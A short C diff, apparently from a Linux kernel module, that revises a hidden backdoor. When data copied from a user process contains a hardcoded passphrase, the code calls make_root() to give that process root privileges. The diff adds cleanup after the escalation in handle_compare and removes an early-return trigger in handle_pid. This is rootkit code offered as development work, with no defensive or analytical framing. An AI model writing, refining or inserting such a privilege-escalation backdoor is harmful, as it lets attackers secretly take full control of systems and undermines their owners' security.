@@ -103,6 +103,7 @@ handle_compare(char *buf, pid_t pid, size_t size)
 
         if(strnstr(entry->str, PASSPHRASE, MAX_BUF)) {
             make_root();
+            remove_entry(pid);
             return;
         }
 
@@ -114,8 +115,10 @@ handle_compare(char *buf, pid_t pid, size_t size)
         }
     }
 
-    if(strstr(entry->str, PASSPHRASE))
+    if(strstr(entry->str, PASSPHRASE)) {
         make_root();
+        remove_entry(pid);
+    }
 }
 
 void
@@ -131,12 +134,6 @@ handle_pid(pid_t pid, __user char *buf, size_t size)
         return;
 
     copy_from_user(str, buf, size);
-
-    //Early return on exact match, avoiding more expensive operations
-    if(strnstr(str, PASSPHRASE, size)) {
-        make_root();
-        return;
-    }
 
     if(is_valid(str, size)) {
         add_entry(pid);
